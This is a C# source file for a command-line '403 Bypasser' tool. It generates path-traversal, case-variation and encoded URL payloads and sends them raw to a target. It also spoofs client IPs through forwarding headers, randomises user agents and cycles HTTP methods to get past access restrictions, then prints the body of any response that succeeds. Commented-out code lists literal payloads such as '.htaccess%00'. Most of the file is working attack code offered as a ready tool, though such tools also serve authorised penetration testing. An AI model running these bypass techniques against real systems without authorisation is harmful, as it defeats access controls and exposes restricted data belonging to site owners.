using Bypasser.RequestHelpers;
using CommandLine;
using System.Net;

namespace Bypasser
{
    public class Program
    {
        static bool randomAgent = false;
        static int _timeout = 0;

        static bool success = false;
        static Dictionary<string, string> successRequests = new Dictionary<string, string>();

        static async Task Main(string[] args)
        {
            //args = ["-u", "http://localhost/.htaccess", "-s", "-r", "-t", "500"];

            PrintBanner();

            var parseResult = Parser.Default.ParseArguments<Options>(args);

            await parseResult.WithParsedAsync(async options =>
            {
                var uri = new Uri(options.Url);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Generating payloads...");

                var payloads = new List<string>();
                payloads.AddRange(PayloadGenerator.PathTraversal(uri.PathAndQuery));
                payloads.AddRange(PayloadGenerator.WordCase(uri.PathAndQuery));
                payloads.AddRange(PayloadGenerator.Encode(uri.PathAndQuery));

                if (options.DryRun)
                {
                    Console.WriteLine($"Generated {payloads.Count} payloads");
                    payloads.ForEach(v => Console.WriteLine($"    {v}"));
                    return;
                }

                using var handler = new HttpClientHandler() { AllowAutoRedirect = false };

                if (!string.IsNullOrEmpty(options.UseProxy))
                {
                    var proxy = new WebProxy(options.UseProxy);

                    handler.Proxy = proxy;
                    handler.UseProxy = true;
                }

                if (options.RandomUserAgent)
                {
                    randomAgent = true;
                }

                if (options.Timeout.HasValue)
                {
                    _timeout = options.Timeout.Value;
                }
                // using var httpClient = new HttpClient(handler);

                Console.WriteLine($"Probing {uri.AbsoluteUri} with payloads...");

                if (!options.SpoofIp)
                {
                    await CheckBypassRaw(uri, payloads);
                }
                else
                {
                    await CheckBypassRaw(uri, payloads);
                    await CheckBypassWithHeadersSingle(uri.OriginalString);
                    await CheckAdditionalHeadersAndMethods(uri.OriginalString);

                    string statusMessage = "";

                    Console.WriteLine();

                    if (success)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        statusMessage = "BYPASSED!";
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        statusMessage = "Couldn't bypass :(";
                    }

                    Console.WriteLine($"Status: {statusMessage}");

                    foreach (var item in successRequests)
                    {
                        Console.WriteLine(item.Key);
                        Console.WriteLine(item.Value);
                        Console.WriteLine();
                    }
                }
            });

            await parseResult.WithNotParsedAsync(async errors =>
            {
                Console.WriteLine("Invalid arguments. Use --help for information.");
            });
        }

        static async Task CheckBypassRaw(Uri uri, List<string> payloads)
        {
            string targetHost = uri.Host;
            int port = uri.AbsoluteUri.StartsWith("https") ? 443 : 80;

            string displayHost = uri.OriginalString.Replace(uri.AbsolutePath, "");

            foreach (var payload in payloads)
            {
                var headers = new Dictionary<string, string>();

                if (randomAgent)
                {
                    var agentHeader = Utility.GetRandomUserAgent();
                    headers.Add(agentHeader.Key, agentHeader.Value);
                }

                try
                {
                    var rawResponseData = await RawRequestSender.SendAsync(targetHost, port, payload, headers);

                    var response = CustomHttpReponse.Parse(rawResponseData);

                    if (response.StatusCode == (int)HttpStatusCode.Forbidden)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                    }
                    else if (response.StatusCode == (int)HttpStatusCode.NotFound)
                    {
                        Console.ForegroundColor = ConsoleColor.Magenta;
                    }
                    else if (response.StatusCode == (int)HttpStatusCode.BadRequest)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                    }

                    Console.WriteLine($"    {displayHost}{payload} {response.StatusCode} {response.StatusMessage}");
                    Console.ResetColor();

                    if (response.StatusCode == 200)
                    {
                        success = true;
                        successRequests.Add(displayHost + payload, response.Body);
                    }
                }
                catch (Exception e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"{payload} - {e.Message}");
                    Console.ResetColor();
                }

                await Task.Delay(_timeout);
            }
        }

        static async Task CheckBypassWithHeadersSingle(string url)
        {
            bool bypassed = false;

            using var client = new HttpClient();

            foreach (var ip in SpoofingConstants.IpList)
            {
                var headers = Utility.AllIpHeaders(ip);

                foreach (var header in headers)
                {
                    var req = RequestConstructor.Create(HttpMethod.Get, url);
                    req.Headers.Add(header.Key, header.Value);

                    if (randomAgent)
                    {
                        var agentHeader = Utility.GetRandomUserAgent();
                        req.Headers.Add(agentHeader.Key, agentHeader.Value);
                    }

                    var res = await client.SendAsync(req);

                    Console.ForegroundColor = res.StatusCode switch
                    {
                        HttpStatusCode.Forbidden => ConsoleColor.Red,
                        HttpStatusCode.NotFound => ConsoleColor.Magenta,
                        _ => ConsoleColor.Green
                    };

                    Console.WriteLine($"    {url} {(int)res.StatusCode} {res.StatusCode} ({header.Key}: {header.Value})");
                    Console.ResetColor();

                    if (res.StatusCode == HttpStatusCode.OK)
                    {
                        bypassed = true;
                        success = true;

                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Successfully bypassed with: {header.Key}: {header.Value}");
                        break;
                    }

                    await Task.Delay(_timeout);
                }

                if (bypassed)
                {
                    break;
                }
            }
        }

        static async Task CheckAdditionalHeadersAndMethods(string url)
        {
            var uri = new Uri(url);
            string baseUrl = uri.OriginalString.Replace(uri.PathAndQuery, "");

            var headers = Utility.AdditionalHeaders(baseUrl);

            using var client = new HttpClient();

            foreach (var header in headers)
            {
                var req = RequestConstructor.Create(HttpMethod.Get, url);
                req.Headers.Add(header.Key, header.Value);

                if (randomAgent)
                {
                    var agentHeader = Utility.GetRandomUserAgent();
                    req.Headers.Add(agentHeader.Key, agentHeader.Value);
                }

                var res = await client.SendAsync(req);

                Console.ForegroundColor = res.StatusCode switch
                {
                    HttpStatusCode.Forbidden => ConsoleColor.Red,
                    HttpStatusCode.NotFound => ConsoleColor.Magenta,
                    _ => ConsoleColor.Green
                };

                Console.WriteLine($"    {url} {(int)res.StatusCode} {res.StatusCode} ({header.Key}: {header.Value})");
                Console.ResetColor();

                if (res.StatusCode == HttpStatusCode.OK)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Successfully bypassed with: {header.Key}: {header.Value}");
                    break;
                }

                await Task.Delay(_timeout);
            }

            var methods = Utility.HttpMethods();

            foreach (var method in methods)
            {
                var req = RequestConstructor.Create(method, url);

                if (randomAgent)
                {
                    var agentHeader = Utility.GetRandomUserAgent();
                    req.Headers.Add(agentHeader.Key, agentHeader.Value);
                }

                var res = await client.SendAsync(req);

                Console.ForegroundColor = res.StatusCode switch
                {
                    HttpStatusCode.Forbidden => ConsoleColor.Red,
                    HttpStatusCode.NotFound => ConsoleColor.Magenta,
                    _ => ConsoleColor.Green
                };

                Console.WriteLine($"    {url} {(int)res.StatusCode} {res.StatusCode} ({method})");
                Console.ResetColor();

                if (res.StatusCode == HttpStatusCode.OK)
                {
                    Console.ForegroundColor = ConsoleColor.Green;

                    success = true;
                    var resContent = await res.Content.ReadAsStringAsync();
                    successRequests.Add($"{url} {method}", resContent);
                }

                await Task.Delay(_timeout);
            }
        }

        static async Task CheckBypassRawWithHeaders(Uri uri, List<string> payloads)
        {
            string targetHost = uri.Host;
            int port = uri.AbsoluteUri.StartsWith("https") ? 443 : 80;

            string displayHost = uri.OriginalString.Replace(uri.AbsolutePath, "");

            var rnd = new Random();

            foreach (var payload in payloads)
            {
                bool bypassed = false;

                for (int stage = 0; stage < 3; stage++)
                {
                    foreach (var ip in SpoofingConstants.IpList)
                    {
                        int delay = rnd.Next(800, 3000);
                        await Task.Delay(delay);

                        Dictionary<string, string> headers = stage switch
                        {
                            0 => Utility.CommonIpHeaders(ip),
                            1 => Utility.ObscureIpHeaders(ip),
                            _ => Utility.AllIpHeaders(ip)
                        };

                        try
                        {
                            var rawResponseData = await RawRequestSender.SendAsync(targetHost, port, payload, headers);

                            var response = CustomHttpReponse.Parse(rawResponseData);

                            if (response.StatusCode == (int)HttpStatusCode.Forbidden)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                            }
                            else if (response.StatusCode == (int)HttpStatusCode.NotFound)
                            {
                                Console.ForegroundColor = ConsoleColor.Magenta;
                            }
                            else if (response.StatusCode == (int)HttpStatusCode.BadRequest)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                            }

                            Console.WriteLine($"    {displayHost}{payload} {response.StatusCode} {response.StatusMessage}");
                            Console.ResetColor();
                        }
                        catch (Exception e)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"{payload} - {e.Message}");
                            Console.ResetColor();
                        }
                    }

                    if (bypassed) break;
                }
            }            
        }

        static void PrintBanner()
        {
            Console.WriteLine("==========================================================");
            Console.WriteLine("|                                                        |");
            Console.WriteLine("|       403 Bypasser - Access Denied? Think Again!       |");
            Console.WriteLine("|                                                        |");
            Console.WriteLine("==========================================================");
            Console.WriteLine();
        }
    }
}


//static async Task CheckBypassWithSpoofing(List<string> urls, HttpClient client)
//{
//    foreach (var url in urls)
//    {
//        bool bypassed = false;

//        for (int stage = 0; stage < 3; stage++)
//        {
//            foreach (var ip in SpoofingConstants.IpList)
//            {
//                Dictionary<string, string> headers = stage switch
//                {
//                    0 => HeadersGenerator.CommonIpHeaders(ip),
//                    1 => HeadersGenerator.ObscureIpHeaders(ip),
//                    _ => HeadersGenerator.AllIpHeaders(ip)
//                };

//                try
//                {
//                    var req = RequestConstructor.Create(HttpMethod.Get, url, headers);

//                    var res = await client.SendAsync(req);

//                    Console.ForegroundColor = res.StatusCode switch
//                    {
//                        HttpStatusCode.Forbidden => ConsoleColor.Red,
//                        HttpStatusCode.NotFound => ConsoleColor.Magenta,
//                        _ => ConsoleColor.Green
//                    };

//                    Console.WriteLine($"    {url} {(int)res.StatusCode} {res.StatusCode} (Spoofed origin: {ip})");
//                    Console.ResetColor();

//                    if (res.StatusCode == HttpStatusCode.OK)
//                    {
//                        bypassed = true;
//                        break;
//                    }
//                }
//                catch (Exception e)
//                {
//                    Console.ForegroundColor = ConsoleColor.Red;
//                    Console.WriteLine($"{url} - {e.Message}");
//                    Console.ResetColor();
//                }
//            }

//            if (bypassed) break;
//        }
//    }
//}

//static async Task CheckBypass(List<string> urls, HttpClient client)
//{
//    foreach (var url in urls)
//    {
//        try
//        {
//            var req = RequestConstructor.Create(HttpMethod.Get, url);

//            var res = await client.SendAsync(req);

//            if (res.StatusCode == HttpStatusCode.Forbidden)
//            {
//                Console.ForegroundColor = ConsoleColor.Red;
//            }
//            else if (res.StatusCode == HttpStatusCode.NotFound)
//            {
//                Console.ForegroundColor = ConsoleColor.Magenta;
//            }
//            else
//            {
//                Console.ForegroundColor = ConsoleColor.Green;
//            }

//            Console.WriteLine($"    {url} {(int)res.StatusCode} {res.StatusCode}");
//            Console.ResetColor();
//        }
//        catch (Exception e)
//        {
//            Console.ForegroundColor = ConsoleColor.Red;
//            Console.WriteLine($"{url} - {e.Message}");
//            Console.ResetColor();
//        }
//    }
//}


//var options = parseResult.Value;

//var url = options.Url;

//Console.ForegroundColor = ConsoleColor.Green;
//Console.WriteLine("Generating payloads...");

//var variations = new List<string>();
//variations.AddRange(PayloadGenerator.Payload(url));
//variations.AddRange(PayloadGenerator.WordCase(url));
//variations.AddRange(PayloadGenerator.Encode(url));

//variations.Add("http://localhost/.././..;/.htaccess");
//variations.Add("http://localhost/.htaccess%00/");
//variations.Add("http://localhost/.htaccess%00");
//variations.Add("http://localhost/%2e%2e;.htaccess");

//variations.AddRange(Payload.PathTraversal(url));

//if (options.DryRun)
//{
//    Console.WriteLine($"Generated {variations.Count} payloads");
//    variations.ForEach(v => Console.WriteLine($"    {v}"));
//    return;
//}

//using var handler = new HttpClientHandler() { AllowAutoRedirect = false };

//if (!string.IsNullOrEmpty(options.UseProxy))
//{
//    var proxy = new WebProxy(options.UseProxy);

//    handler.Proxy = proxy;
//    handler.UseProxy = true;
//}

//using var httpClient = new HttpClient(handler);

//Console.WriteLine("Probing target with payloads...");

//if (!options.SpoofIp)
//{
//    await CheckBypass(variations, httpClient);
//}
//else
//{
//    await CheckBypassWithSpoofing(variations, httpClient);
//}